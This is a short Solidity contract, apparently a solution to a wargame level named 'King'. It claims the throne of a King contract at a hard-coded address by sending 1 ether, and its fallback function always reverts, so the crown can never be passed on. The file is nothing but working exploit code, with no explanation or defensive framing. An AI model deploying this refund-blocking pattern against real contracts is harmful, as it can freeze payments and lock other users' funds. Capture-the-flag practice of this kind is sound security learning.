import "./King.sol";

pragma solidity ^0.4.18;

contract KingBreaker {
    King public king = King(0x0a0374a1d74bf12750c265beee89c840bfcd6639);

    function KingBreaker() public payable {}

    function becomeKing() public {
        king.call.value(1000000000000000000).gas(4000000)();
    }

    function() external payable {
        revert();
    }
}

// 0x4c21503b57274d27aeb84054cd8dc1416d68fdf4